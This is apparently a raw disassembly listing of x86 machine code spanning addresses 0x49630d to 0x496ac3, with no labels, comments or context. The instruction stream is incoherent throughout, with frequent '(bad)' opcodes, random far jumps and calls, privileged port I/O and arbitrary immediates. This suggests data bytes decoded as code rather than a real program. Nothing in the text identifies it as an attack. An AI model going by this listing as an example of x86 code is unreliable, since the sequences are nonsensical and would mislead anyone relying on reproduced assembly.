  49630d:	js     0x496326
  49630f:	scas   al,BYTE PTR es:[edi]
  496310:	sub    DWORD PTR [edi],0x5b
  496313:	push   eax
  496314:	mov    eax,ds:0x18376881
  496319:	jae    0x4962f6
  49631b:	mov    cl,0xc3
  49631d:	fisub  DWORD PTR [ecx+0x6f]
  496320:	push   0x7
  496322:	cmp    bl,BYTE PTR [edi]
  496324:	add    edx,esi
  496326:	(bad)  
  496327:	adc    BYTE PTR [ecx],0xc3
  49632a:	addr16 mov edi,0x5c0aa666
  496330:	adc    eax,0x4c5b6977
  496335:	inc    edi
  496336:	cmp    BYTE PTR [edx+0x1baaaf2d],bl
  49633c:	fbld   TBYTE PTR [edx+0x54]
  49633f:	popf   
  496340:	push   es
  496341:	mov    edx,0x6099285b
  496346:	mov    DWORD PTR [edi+0x22c1736f],edx
  49634c:	inc    eax
  49634d:	shl    DWORD PTR [esi],0x52
  496350:	sti    
  496351:	scas   eax,DWORD PTR es:[edi]
  496352:	jns    0x4963c4
  496354:	jne    0x49637e
  496356:	mov    ebx,0xd2ee317
  49635b:	test   BYTE PTR [eax-0x30],bh
  49635e:	sbb    ch,BYTE PTR [ebx+0x63]
  496361:	ins    DWORD PTR es:[edi],dx
  496362:	or     bh,ch
  496364:	inc    edx
  496365:	add    bh,bl
  496367:	aas    
  496368:	je     0x4963a5
  49636a:	rcr    BYTE PTR [edx-0x18b09f4c],0xff
  496371:	sub    DWORD PTR [edi-0x2d],0x3bc78368
  496378:	jae    0x49638b
  49637a:	ins    DWORD PTR es:[edi],dx
  49637b:	mov    DWORD PTR [eax-0x51],0x2592436c
  496382:	xor    ecx,DWORD PTR [edx+ebp*4]
  496385:	test   eax,0x9bab6143
  49638a:	addr16 inc edx
  49638c:	mov    BYTE PTR [ecx+0x67e7636d],cl
  496392:	cmp    eax,DWORD PTR [edi+0x1d42a1b]
  496398:	dec    esi
  496399:	jb     0x4963b6
  49639b:	dec    ebx
  49639c:	lea    edx,[edi]
  49639e:	xchg   DWORD PTR [edx+0x23],ebp
  4963a1:	inc    ecx
  4963a2:	fild   QWORD PTR [esi-0x7c5953cb]
  4963a8:	cmp    edx,DWORD PTR [ebx-0x3a7dafa5]
  4963ae:	jne    0x4963ca
  4963b0:	retf   
  4963b1:	dec    ebx
  4963b2:	fisubr DWORD PTR ds:0x7742b058
  4963b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4963b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4963ba:	pop    ds
  4963bb:	adc    BYTE PTR [ebx],0x53
  4963be:	loope  0x4963d7
  4963c0:	pop    ss
  4963c1:	jae    0x4963ae
  4963c3:	lods   eax,DWORD PTR ds:[esi]
  4963c4:	add    dh,BYTE PTR [edi-0x65]
  4963c7:	sub    cl,bl
  4963c9:	daa    
  4963ca:	cmp    ch,BYTE PTR [edi]
  4963cc:	adc    al,0x61
  4963ce:	jne    0x49637c
  4963d0:	scas   eax,DWORD PTR es:[edi]
  4963d1:	retf   
  4963d2:	out    0x65,eax
  4963d4:	lea    ecx,[ecx+0x57450f69]
  4963da:	mov    ch,0x83
  4963dc:	outs   dx,DWORD PTR ds:[esi]
  4963dd:	mov    esp,0xff79da52
  4963e2:	push   ds
  4963e3:	jb     0x496389
  4963e5:	dec    ecx
  4963e6:	push   edi
  4963e7:	loope  0x496468
  4963e9:	inc    ebx
  4963ea:	arpl   WORD PTR [ebx+0x35],di
  4963ed:	or     eax,0x7a7b0eb0
  4963f2:	or     ebp,DWORD PTR [esi+0x54]
  4963f5:	pop    es
  4963f6:	mov    esi,DWORD PTR [edx+0x7e]
  4963f9:	sub    al,0x2b
  4963fb:	mov    ss,WORD PTR [ecx+eiz*8-0x1d]
  4963ff:	mov    bl,bh
  496401:	dec    esi
  496402:	ds push esp
  496404:	sti    
  496405:	mov    cl,0xd8
  496407:	loopne 0x49638a
  496409:	mov    fs,esi
  49640b:	xchg   DWORD PTR [esi+0x62c5688],ebp
  496411:	(bad)  
  496412:	aaa    
  496413:	pop    ds
  496414:	scas   al,BYTE PTR es:[edi]
  496415:	rcr    dl,1
  496417:	and    eax,0x64d753ff
  49641c:	sbb    BYTE PTR [ecx-0xc940bc6],dh
  496422:	dec    edi
  496423:	sub    ch,BYTE PTR [eax+eax*4]
  496426:	aad    0xa7
  496428:	sbb    ebx,ebx
  49642a:	(bad)  
  49642c:	test   eax,0x53af75a9
  496431:	sub    ch,al
  496433:	mov    eax,0x30d21dc2
  496438:	mov    cl,BYTE PTR [edx]
  49643a:	and    edx,DWORD PTR [edi]
  49643c:	and    BYTE PTR [edi],0x87
  49643f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496440:	sub    esp,DWORD PTR [edi+0x27]
  496443:	daa    
  496444:	sbb    al,0xd7
  496446:	xlat   BYTE PTR ds:[ebx]
  496447:	sub    dh,BYTE PTR [edi+0x1aa26cff]
  49644d:	push   edi
  49644e:	adc    al,0x43
  496450:	sbb    edx,DWORD PTR [edi]
  496452:	ror    BYTE PTR [esi],1
  496454:	outs   dx,BYTE PTR ds:[esi]
  496455:	inc    eax
  496456:	pop    edi
  496457:	and    ch,BYTE PTR [edi]
  496459:	or     ch,BYTE PTR [esi]
  49645b:	fwait
  49645c:	add    BYTE PTR [ebx+0x6f19435d],cl
  496462:	mov    ebp,DWORD PTR [esi+0x67]
  496465:	shr    edx,1
  496467:	aam    0x41
  496469:	adc    eax,0x3528379b
  49646e:	loope  0x4964c6
  496470:	push   esi
  496471:	daa    
  496472:	lea    esp,[esi]
  496474:	dec    edx
  496475:	lods   al,BYTE PTR ds:[esi]
  496476:	jnp    0xc3602ea0
  49647c:	xchg   edi,eax
  49647d:	ss jecxz 0x49641f
  496480:	add    edx,DWORD PTR [esi-0x20d8a798]
  496486:	inc    DWORD PTR [ecx]
  496488:	rol    BYTE PTR [ebx+0x3607a9a3],0x63
  49648f:	dec    edi
  496490:	(bad)  
  496491:	test   BYTE PTR ds:0x8833d03,0x47
  496498:	jp     0x496507
  49649a:	and    ecx,DWORD PTR [ebx]
  49649c:	dec    ebp
  49649d:	jnp    0x4964d9
  49649f:	inc    esp
  4964a0:	inc    ebx
  4964a1:	and    eax,DWORD PTR [ebx]
  4964a3:	mov    dl,0x79
  4964a5:	xadd   BYTE PTR [ecx-0x1a],dl
  4964a9:	pop    es
  4964aa:	push   ds
  4964ab:	push   esp
  4964ac:	sahf   
  4964ad:	mov    ebx,0x5765e78b
  4964b2:	out    0x1f,eax
  4964b4:	push   0x5c467500
  4964b9:	fistp  DWORD PTR [ebp+0x1f]
  4964bc:	pop    ss
  4964bd:	add    edx,edi
  4964bf:	push   es
  4964c0:	outs   dx,DWORD PTR ds:[esi]
  4964c1:	fistp  QWORD PTR [ebx+0x6db66dd]
  4964c7:	jnp    0x4964e4
  4964c9:	pop    es
  4964ca:	xchg   DWORD PTR [ebx+0x1f],esi
  4964cd:	or     DWORD PTR [edi+0x76bb687b],edx
  4964d3:	outs   dx,BYTE PTR ds:[esi]
  4964d4:	daa    
  4964d5:	or     BYTE PTR [edi+0x1d58712],ch
  4964db:	mov    esp,0x71bc36d
  4964e0:	(bad)  
  4964e2:	mov    bl,0x37
  4964e4:	dec    edx
  4964e5:	dec    DWORD PTR [edi]
  4964e7:	ins    BYTE PTR es:[edi],dx
  4964e8:	inc    ecx
  4964e9:	retf   0xe1b8
  4964ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4964ed:	pop    es
  4964ee:	aas    
  4964ef:	gs (bad) 
  4964f1:	pop    ss
  4964f2:	add    esi,esp
  4964f4:	mov    eax,0x3076e0b
  4964f9:	repz pop es
  4964fb:	pop    esi
  4964fc:	aaa    
  4964fd:	jne    0x4964d7
  4964ff:	mov    ebp,0xfe66707
  496504:	inc    esi
  496505:	bound  edx,QWORD PTR cs:[esi]
  496508:	and    eax,DWORD PTR [eax]
  49650a:	pop    esi
  49650b:	cmp    eax,0xeb93056b
  496510:	add    eax,0xb037bbdb
  496515:	and    ebp,DWORD PTR [edx]
  496517:	ret    
  496518:	cs ds add al,0xf3
  49651c:	fiadd  DWORD PTR [esi]
  49651e:	fst    DWORD PTR [ecx+0x22]
  496521:	div    DWORD PTR [esi-0x5]
  496524:	lods   eax,DWORD PTR ds:[esi]
  496525:	loope  0x4964a9
  496527:	xchg   edi,eax
  496528:	or     DWORD PTR [ecx],0x7
  49652b:	je     0x4964fc
  49652d:	or     BYTE PTR [eax+eiz*2-0x58],dh
  496531:	add    DWORD PTR [edi],edx
  496533:	out    dx,eax
  496534:	das    
  496535:	sbb    al,0x1d
  496537:	fnstsw WORD PTR [edi+0x18]
  49653a:	pop    edi
  49653b:	push   ebx
  49653c:	push   ds
  49653d:	jl     0x4965ab
  49653f:	sub    DWORD PTR [esi+0x615f9b2b],0x46
  496546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496547:	or     bh,BYTE PTR [ebx]
  496549:	jnp    0x4964ee
  49654b:	fimul  DWORD PTR [edi+0x78963f55]
  496551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496552:	ins    BYTE PTR es:[edi],dx
  496553:	jae    0x49656f
  496555:	shr    DWORD PTR [edi+0x1fef0155],0x10
  49655c:	sahf   
  49655d:	sub    bl,BYTE PTR [ebx+edi*8-0x2e]
  496561:	jae    0x49657e
  496563:	xor    esp,DWORD PTR [esi+0x5b]
  496566:	mov    eax,0xcf91aef7
  49656b:	fwait
  49656c:	das    
  49656d:	mov    ah,BYTE PTR [eax]
  49656f:	mov    ch,0x3b
  496571:	sub    BYTE PTR [edi+0x1c],bl
  496574:	cli    
  496575:	xlat   BYTE PTR ds:[ebx]
  496576:	adc    eax,0x733c6368
  49657b:	outs   dx,BYTE PTR ds:[esi]
  49657c:	xchg   BYTE PTR [ebp+0x3b],ah
  49657f:	je     0x49651e
  496581:	ja     0x49650b
  496583:	fisttp DWORD PTR [edx+0x68]
  496586:	jmp    0x289d:0xf5d80310
  49658d:	cvttps2pi mm4,QWORD PTR [edi-0x1dc14e7e]
  496594:	aas    
  496595:	mov    bl,0xe
  496597:	xchg   edx,eax
  496599:	and    DWORD PTR [edi],ecx
  49659b:	outs   dx,BYTE PTR ds:[esi]
  49659c:	and    DWORD PTR [ebx-0x11],0x45
  4965a0:	aas    
  4965a1:	lock dec ebx
  4965a3:	outs   dx,DWORD PTR ds:[esi]
  4965a4:	imul   edx,DWORD PTR [esi],0x6c338f63
  4965aa:	cmp    eax,ebp
  4965ac:	mov    ebx,0xb16cfc1
  4965b1:	fs das 
  4965b3:	mov    ds:0x53b70056,eax
  4965b8:	mov    edx,0xb90cc783
  4965bd:	fdiv   QWORD PTR [ebp+0x75]
  4965c0:	jnp    0x4965e9
  4965c2:	daa    
  4965c3:	je     0x496575
  4965c5:	fisub  DWORD PTR [edx]
  4965c7:	mov    DWORD PTR [ebx+0x5bbc53f2],0x33732ac1
  4965d1:	jp     0x496585
  4965d3:	inc    ebx
  4965d4:	inc    ecx
  4965d5:	jmp    0x496559
  4965d7:	mov    dh,0x36
  4965d9:	cmp    bl,BYTE PTR [edi-0x1f89e4d2]
  4965df:	lea    edi,[ebx+ebp*4+0x3f]
  4965e3:	sub    ecx,DWORD PTR [ebx+0x3b09b539]
  4965e9:	lahf   
  4965ea:	push   ebx
  4965eb:	and    esp,DWORD PTR [edi+0x13a34505]
  4965f1:	arpl   WORD PTR [edi+0x47],ax
  4965f4:	stos   DWORD PTR es:[edi],eax
  4965f5:	inc    ebp
  4965f6:	inc    edi
  4965f7:	dec    ebx
  4965f8:	popa   
  4965f9:	mov    DWORD PTR [ebx-0x42caa21a],0xd71fab45
  496603:	xor    DWORD PTR [eax],esi
  496605:	add    BYTE PTR [ecx],ch
  496607:	sar    BYTE PTR [esi-0x5d],0x3b
  49660b:	(bad)  
  49660c:	lea    esi,ds:0x83e70f60
  496612:	sbb    ebp,DWORD PTR [edi+0x1]
  496615:	xchg   ebx,eax
  496616:	arpl   bx,si
  496618:	aam    0xd3
  49661a:	mov    ds:0x5f47ae16,eax
  49661f:	inc    edx
  496620:	lods   al,BYTE PTR ds:[esi]
  496621:	mov    dh,0xfc
  496623:	arpl   WORD PTR [edi+ebp*1+0x6f],si
  496627:	int3   
  496628:	cmp    ah,BYTE PTR [eax]
  49662a:	cmp    BYTE PTR [esi+0x7],ah
  49662d:	and    bl,dh
  49662f:	sbb    dl,dh
  496631:	xchg   ecx,eax
  496632:	mov    bl,ah
  496634:	ja     0x4966b1
  496636:	js     0x49661a
  496638:	mov    al,ds:0x43b73e8
  49663d:	mov    ds:0xb813e5a1,al
  496642:	jnp    0x496672
  496644:	jb     0x4966ba
  496646:	mov    eax,ds:0xd7eb5429
  49664b:	dec    esi
  49664c:	jp     0x496650
  49664e:	push   cs
  49664f:	push   esi
  496650:	fwait
  496651:	xchg   edi,eax
  496652:	xchg   edi,eax
  496653:	jo     0x4966b8
  496655:	add    al,0x3b
  496657:	inc    esi
  496658:	push   esi
  496659:	push   edi
  49665a:	mov    bl,0x3a
  49665c:	sub    al,0x62
  49665e:	pop    ss
  49665f:	pop    ds
  496660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496661:	add    ebp,DWORD PTR [eax+edx*2-0x7c]
  496665:	sub    DWORD PTR [edx],eax
  496667:	add    ebx,DWORD PTR [edi]
  496669:	mov    edi,DWORD PTR [ecx]
  49666b:	or     al,BYTE PTR [ebp+0x630b9f82]
  496671:	in     eax,dx
  496672:	mov    gs,WORD PTR [ebx-0x63]
  496675:	push   esi
  496676:	jae    0x49664f
  496678:	sbb    DWORD PTR [edi-0x4f],edi
  49667b:	mov    ds:0xa36f4700,eax
  496680:	and    eax,0xa869e267
  496685:	push   esi
  496686:	repz and eax,0x6b0e3832
  49668c:	ins    DWORD PTR es:[edi],dx
  49668d:	sbb    dl,BYTE PTR [esi+0x3b]
  496690:	push   edx
  496691:	sbb    cl,BYTE PTR ds:0xb62e4b04
  496697:	fs push ebx
  496699:	je     0x496701
  49669b:	and    eax,0xffffff80
  49669e:	mov    edi,0x29b7b366
  4966a3:	jmp    0xeb64b612
  4966a8:	ret    
  4966a9:	cmp    edi,DWORD PTR ds:0xd988742a
  4966af:	fisub  WORD PTR [edi+0x2636366]
  4966b5:	div    BYTE PTR [ecx]
  4966b7:	(bad)  
  4966b9:	aas    
  4966ba:	not    DWORD PTR [ebx]
  4966bc:	shr    DWORD PTR [edx+0x17cf1038],0x10
  4966c3:	bound  ebp,QWORD PTR [eax+0x1a]
  4966c6:	or     eax,0x51148bab
  4966cb:	xchg   ebx,eax
  4966cc:	xor    BYTE PTR [edx-0x3a3f5029],al
  4966d2:	fld    QWORD PTR cs:[edx+ebp*2-0x5d]
  4966d7:	aas    
  4966d8:	jmp    0xefd080b0
  4966dd:	ret    0x1157
  4966e0:	inc    edx
  4966e1:	lea    esp,[ebx-0x2a]
  4966e4:	xchg   esi,eax
  4966e5:	dec    ebx
  4966e6:	arpl   WORD PTR [edi],sp
  4966e8:	fisttp WORD PTR [esi]
  4966ea:	pop    esp
  4966eb:	adc    DWORD PTR [edi],edx
  4966ed:	adc    BYTE PTR [ebx+0x4b],bh
  4966f0:	jb     0x4966a4
  4966f2:	xchg   ecx,eax
  4966f3:	pop    esp
  4966f4:	add    eax,0x883320a7
  4966f9:	jecxz  0x4966d0
  4966fb:	call   0xe0a:0x6f6983ff
  496702:	pop    edx
  496703:	sar    DWORD PTR [esi-0x709b9cba],1
  496709:	mov    eax,ds:0x172ed160
  49670e:	jg     0x496773
  496710:	lods   eax,DWORD PTR ds:[esi]
  496711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496712:	pop    edx
  496713:	mov    ah,0x18
  496715:	pop    edi
  496716:	outs   dx,DWORD PTR ds:[esi]
  496717:	arpl   WORD PTR ds:0x83356d2e,ax
  49671d:	pop    edi
  49671e:	dec    edi
  49671f:	stos   DWORD PTR es:[edi],eax
  496720:	fisttp QWORD PTR [eax-0x73]
  496723:	pop    edx
  496724:	(bad)  
  496725:	jg     0x4966ab
  496727:	test   BYTE PTR [esi+0x23638b62],0x1a
  49672e:	xor    BYTE PTR [edi+0x45],dl
  496731:	or     BYTE PTR [edi+esi*8-0x45],dl
  496735:	adc    BYTE PTR [eax],dl
  496737:	fidivr WORD PTR [eax]
  496739:	push   0xffffffc3
  49673b:	push   cs
  49673c:	and    cl,BYTE PTR [edx-0x20]
  49673f:	push   0x38
  496741:	dec    ebx
  496742:	imul   ecx,DWORD PTR ds:0xf0953597,0x26
  496749:	sub    eax,0x1633201e
  49674e:	ret    0x571d
  496751:	or     al,0x6
  496753:	dec    ebx
  496754:	ins    BYTE PTR es:[edi],dx
  496755:	push   edi
  496756:	fs inc esp
  496758:	pop    eax
  496759:	and    cl,BYTE PTR ds:0xaaf76613
  49675f:	mov    al,0xba
  496761:	jo     0x49678b
  496763:	ret    
  496764:	xchg   BYTE PTR [ebx-0x7c],dh
  496767:	adc    DWORD PTR [edi+0x124f3340],0xffffffbe
  49676e:	dec    ebx
  49676f:	repnz out dx,al
  496771:	jo     0x496779
  496773:	pop    ss
  496774:	adc    eax,eax
  496776:	cmp    BYTE PTR [eax],dl
  496778:	mov    ds:0x13c62f1f,al
  49677d:	inc    esi
  49677e:	lds    edx,FWORD PTR [edi+0x5b]
  496781:	(bad)  
  496782:	bound  edi,QWORD PTR [edx]
  496784:	stos   BYTE PTR es:[edi],al
  496785:	imul   DWORD PTR [ecx+0x23]
  496788:	call   0x8728:0x5363b046
  49678f:	inc    edi
  496790:	lea    eax,[eax-0x5a]
  496793:	and    eax,0x20418a3
  496798:	mov    cl,0x4b
  49679a:	or     esp,DWORD PTR [ebx-0x79]
  49679d:	sbb    ch,al
  49679f:	scas   al,BYTE PTR es:[edi]
  4967a0:	(bad)  
  4967a1:	and    edi,eax
  4967a3:	mov    bh,0x18
  4967a5:	adc    eax,0x1f876060
  4967aa:	mov    bl,0x48
  4967ac:	pop    ss
  4967ad:	mov    dh,0x8d
  4967af:	sub    esp,DWORD PTR [ebx-0x6]
  4967b2:	gs push 0x64d88307
  4967b8:	jg     0x4967c1
  4967ba:	jg     0x4967aa
  4967bc:	dec    ebp
  4967bd:	push   ecx
  4967be:	jmp    0x4967cd
  4967c0:	addr16 or al,0xb6
  4967c3:	das    
  4967c4:	xlat   BYTE PTR ds:[ebx]
  4967c6:	xchg   esp,eax
  4967c7:	pop    eax
  4967c8:	add    DWORD PTR [edi-0x7eedf17d],ebp
  4967ce:	push   ebp
  4967cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4967d0:	mov    ds:0x5a15eb63,eax
  4967d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4967d6:	push   esp
  4967d7:	pop    ebx
  4967d8:	sub    edx,ebx
  4967da:	sbb    eax,0x13d06696
  4967df:	fisubr WORD PTR ss:[edi+0x23]
  4967e3:	jns    0x496850
  4967e5:	bts    DWORD PTR [eax-0x79],ecx
  4967e9:	mov    ds:0xf886cf12,al
  4967ee:	push   cs
  4967ef:	stos   BYTE PTR es:[edi],al
  4967f0:	popa   
  4967f1:	or     esp,DWORD PTR [edi+edx*2+0x69]
  4967f5:	mov    bh,0x42
  4967f7:	xor    eax,DWORD PTR [ebx]
  4967f9:	xchg   ebx,eax
  4967fa:	pop    ss
  4967fb:	jae    0x496876
  4967fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4967fe:	sub    eax,0xd353e0b8
  496803:	fs mov bh,0xaf
  496806:	or     DWORD PTR [eax-0x3dfa43b1],ecx
  49680c:	mov    ch,BYTE PTR [ebx-0x41]
  49680f:	fnsave [eax]
  496811:	adc    eax,0x6ee37ae9
  496816:	xchg   DWORD PTR [edx-0x56],esi
  496819:	cmp    eax,0x637a1c9c
  49681e:	jo     0x496877
  496820:	add    DWORD PTR [edx],ebp
  496822:	in     eax,dx
  496823:	(bad)  
  496824:	jg     0x49684c
  496826:	cmp    eax,0x82c2384f
  49682b:	aaa    
  49682c:	mov    eax,0x34224f3
  496831:	pop    ss
  496832:	fwait
  496833:	cmp    al,BYTE PTR [ebx+0x35cc2e01]
  496839:	push   edx
  49683a:	sbb    eax,DWORD PTR [ebp-0x16]
  49683d:	push   es
  49683e:	jle    0x4968b2
  496840:	outs   dx,DWORD PTR ds:[esi]
  496841:	xor    al,0xd4
  496843:	lock imul ebp,esp,0x395f5031
  49684a:	mov    BYTE PTR [esi+edx*4],dl
  49684d:	mov    al,ds:0x49959ba7
  496852:	mov    ebp,0x54522216
  496857:	dec    esp
  496858:	pop    ebp
  496859:	push   ss
  49685a:	add    bh,al
  49685c:	rcr    BYTE PTR [ebp+0x48],0x43
  496860:	mov    bl,0x81
  496862:	adc    BYTE PTR [ebx+0x38c0276b],dh
  496868:	cmp    al,0x2
  49686a:	adc    dl,BYTE PTR [ebx+0x1c]
  49686d:	add    DWORD PTR [edi],ebp
  49686f:	add    al,0xa4
  496871:	dec    ebx
  496872:	adc    BYTE PTR gs:[ebp-0xa],dl
  496876:	out    dx,al
  496877:	sub    eax,0x9d0eb86c
  49687c:	cmp    BYTE PTR [edi+0x14],dh
  49687f:	fcmovbe st,st(6)
  496881:	and    al,BYTE PTR [ebp-0x7cb90dea]
  496887:	push   esp
  496888:	dec    eax
  496889:	ins    DWORD PTR es:[edi],dx
  49688a:	add    ebx,DWORD PTR [ecx+0x22323359]
  496890:	cmp    BYTE PTR [ebx+0x42],al
  496893:	(bad)  [ecx-0x2d]
  496896:	adc    al,0x5e
  496898:	mov    dl,BYTE PTR [esi-0x5]
  49689b:	push   cs
  49689c:	xchg   DWORD PTR [ebx+esi*1],ebx
  49689f:	dec    ebp
  4968a0:	or     dh,BYTE PTR [ebx+0x36]
  4968a3:	pop    ebx
  4968a4:	adc    bh,BYTE PTR [esi-0x31]
  4968a7:	inc    ebx
  4968a8:	xchg   ecx,ebx
  4968aa:	out    dx,al
  4968ab:	adc    bl,0x14
  4968ae:	and    al,0x1d
  4968b0:	push   ecx
  4968b1:	mov    ah,0xf2
  4968b3:	outs   dx,WORD PTR ds:[esi]
  4968b5:	push   0xffffffbf
  4968b7:	pusha  
  4968b8:	stos   BYTE PTR es:[edi],al
  4968b9:	jae    0x49690c
  4968bb:	pop    eax
  4968bc:	adc    bl,ch
  4968be:	xchg   edx,eax
  4968bf:	pop    esi
  4968c0:	or     cl,BYTE PTR [ecx-0x65]
  4968c3:	jle    0x496862
  4968c5:	add    eax,0xcd4af818
  4968ca:	adc    BYTE PTR [edi+0x4e041976],cl
  4968d0:	xor    eax,0xd057df10
  4968d5:	dec    ebp
  4968d6:	dec    ebx
  4968d7:	rcl    BYTE PTR [edi+eax*8],1
  4968da:	(bad)  
  4968db:	fdivr  QWORD PTR [eax+0x21627069]
  4968e1:	dec    ecx
  4968e2:	pop    ebp
  4968e3:	shl    BYTE PTR [ebx+esi*4+0x26c6c109],cl
  4968ea:	cmc    
  4968eb:	adc    BYTE PTR [eax-0x758d9a9f],dh
  4968f1:	(bad)  
  4968f3:	or     edi,0x3a705357
  4968f9:	adc    BYTE PTR [edx],bh
  4968fb:	inc    esp
  4968fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4968fd:	sub    DWORD PTR [ebx],0x78141cf3
  496903:	or     BYTE PTR [ebx],0x99
  496906:	add    al,0x43
  496908:	pop    eax
  496909:	sub    ah,BYTE PTR [ebp+0x1061c0b4]
  49690f:	sbb    DWORD PTR [esi],0x52
  496912:	out    0x6d,eax
  496914:	and    al,0xc
  496916:	cmp    eax,esp
  496918:	xchg   DWORD PTR [edi-0x66],esp
  49691b:	shl    BYTE PTR [edi-0x2a],0x8c
  49691f:	adc    BYTE PTR ds:0xded0303e,dh
  496925:	pop    es
  496926:	lea    edx,[ebp+0x78]
  496929:	adc    eax,0x9b530512
  49692e:	aam    0x8
  496930:	push   eax
  496931:	mov    ah,0x28
  496933:	fsubr  QWORD PTR [esi+0x59]
  496936:	shl    BYTE PTR [esi],0x5b
  496939:	pushf  
  49693a:	call   0x1e4d:0xe5059275
  496941:	adc    al,0x76
  496943:	mov    dh,0xde
  496945:	shl    BYTE PTR [edx+ebx*8+0x19fbcd24],cl
  49694c:	mov    esp,0x45107559
  496951:	jne    0x496968
  496953:	sbb    al,0xc1
  496955:	sub    BYTE PTR [edx],bl
  496957:	jp     0x4969cb
  496959:	inc    ebx
  49695a:	ins    DWORD PTR es:[edi],dx
  49695b:	adc    bl,BYTE PTR [ecx+0x53]
  49695e:	je     0x49697c
  496960:	sub    ah,BYTE PTR [edx]
  496962:	xor    DWORD PTR [esi+0x47],0x495041e1
  496969:	sub    ah,BYTE PTR [ebx+ecx*2-0x67]
  49696d:	cmp    al,ah
  49696f:	fwait
  496970:	adc    BYTE PTR [eax+0x8926ddd],ah
  496976:	mov    esp,0x69259112
  49697b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49697c:	sbb    al,0xbc
  49697e:	push   esp
  49697f:	dec    ecx
  496980:	inc    esp
  496981:	ins    BYTE PTR es:[edi],dx
  496982:	mov    BYTE PTR [bp+di],dh
  496985:	adc    al,0x76
  496987:	sub    dl,bl
  496989:	sub    eax,0x126ca0da
  49698e:	adc    BYTE PTR [ebx+0x3f10a408],bh
  496994:	push   es
  496995:	not    BYTE PTR ds:0x6588aa0c
  49699b:	shr    bh,1
  49699d:	push   ebp
  49699e:	sbb    ax,0x5286
  4969a2:	or     dl,dl
  4969a4:	add    dh,ch
  4969a6:	iret   
  4969a7:	cmp    DWORD PTR ds:0xdef10e9,eax
  4969ad:	div    BYTE PTR [edx+0xb05bc05]
  4969b3:	inc    DWORD PTR [ebx]
  4969b5:	in     al,dx
  4969b6:	push   ebx
  4969b7:	jnp    0x496992
  4969b9:	add    dl,cl
  4969bb:	add    eax,DWORD PTR [ebp+0x8d75308]
  4969c1:	xlat   BYTE PTR ds:[ebx]
  4969c2:	or     DWORD PTR [eax],ecx
  4969c4:	popa   
  4969c5:	jmp    0x5411:0xcd03a5c5
  4969cc:	bound  ebx,QWORD PTR [ecx-0x59a6f8e6]
  4969d2:	sbb    al,0x77
  4969d4:	shl    DWORD PTR [ecx-0x159f11fa],0x81
  4969db:	or     esi,DWORD PTR [ebx+0x3]
  4969de:	add    al,0x3
  4969e0:	das    
  4969e1:	cwde   
  4969e2:	cli    
  4969e3:	mov    edx,0x4590345
  4969e8:	pop    ss
  4969e9:	pop    esi
  4969ea:	adc    eax,0xc07e100
  4969ef:	popa   
  4969f0:	or     al,0x46
  4969f2:	push   ebx
  4969f3:	adc    BYTE PTR [eax],dl
  4969f5:	push   ds
  4969f6:	jle    0x496a26
  4969f8:	inc    DWORD PTR [edi]
  4969fa:	dec    ebp
  4969fb:	add    al,0x0
  4969fd:	test   BYTE PTR [edi],cl
  4969ff:	ja     0x496a0b
  496a01:	or     eax,0x3bed8400
  496a06:	ins    DWORD PTR es:[edi],dx
  496a07:	xlat   BYTE PTR ds:[ebx]
  496a08:	add    bl,dh
  496a0a:	mov    bl,0x77
  496a0c:	or     esi,DWORD PTR [ecx]
  496a0e:	rol    DWORD PTR [edx],1
  496a10:	cmc    
  496a11:	or     DWORD PTR [ebx],ebx
  496a13:	and    ecx,DWORD PTR [ebx*1+0x23067ad9]
  496a1a:	rcl    esp,0x83
  496a1d:	sub    al,0x71
  496a1f:	dec    edi
  496a20:	or     esi,DWORD PTR [ebp-0x36]
  496a23:	aam    0x14
  496a25:	inc    ebx
  496a26:	pop    es
  496a27:	test   eax,0xa980a26a
  496a2c:	mov    ecx,DWORD PTR [eax]
  496a2e:	push   0x9d4daaea
  496a33:	pop    es
  496a34:	aaa    
  496a35:	fwait
  496a36:	aam    0x2a
  496a38:	xor    DWORD PTR [edi+0x7],ebx
  496a3b:	xor    BYTE PTR [ebx+0x15917bd4],bl
  496a41:	inc    ecx
  496a42:	dec    edx
  496a43:	aam    0x82
  496a45:	xor    al,0x7
  496a47:	and    DWORD PTR [ebx-0x26],ebx
  496a4a:	bound  edx,QWORD PTR [ebx+0x170a607f]
  496a50:	jl     0x496a82
  496a52:	cwde   
  496a53:	aam    0x89
  496a55:	add    ah,BYTE PTR [eax+0xa]
  496a58:	pusha  
  496a59:	add    dl,BYTE PTR [edi]
  496a5b:	sbb    BYTE PTR [ebp+0x44620d81],cl
  496a61:	dec    eax
  496a62:	stos   DWORD PTR es:[edi],eax
  496a63:	ja     0x496a4d
  496a65:	(bad)  [ebx]
  496a67:	jl     0x496a22
  496a69:	and    eax,0x51802a0
  496a6e:	jnp    0x496a91
  496a70:	add    al,BYTE PTR [esi]
  496a72:	pop    ecx
  496a73:	xor    ecx,DWORD PTR ds:0xe137861d
  496a79:	adc    al,0x20
  496a7b:	add    esi,ebx
  496a7d:	sti    
  496a7e:	dec    DWORD PTR [edi-0x30]
  496a81:	mov    bh,0xd0
  496a83:	mov    al,0xd0
  496a85:	mov    cl,0xd0
  496a87:	mov    ebx,0xbad0bed0
  496a8c:	sar    BYTE PTR [eax-0x4df17f2f],1
  496a92:	and    bh,BYTE PTR [ebp+0x18b08000]
  496a98:	mov    edi,0xac317080
  496a9d:	mov    edi,0x839206bf
  496aa2:	loope  0x496ab7
  496aa4:	(bad)  
  496aa5:	mov    bl,0xd0
  496aa7:	jne    0x496a51
  496aa9:	imul   ebp,eax,0x5320fd14
  496aaf:	add    al,0x86
  496ab1:	add    eax,0x53e2304d
  496ab6:	xchg   edx,eax
  496ab7:	imul   esp,DWORD PTR [esi-0x31],0x2026654c
  496abe:	ins    DWORD PTR es:[edi],dx
  496abf:	push   edx
  496ac0:	or     BYTE PTR [esi+0x17],bl
  496ac3:	test   eax,0x97b30008
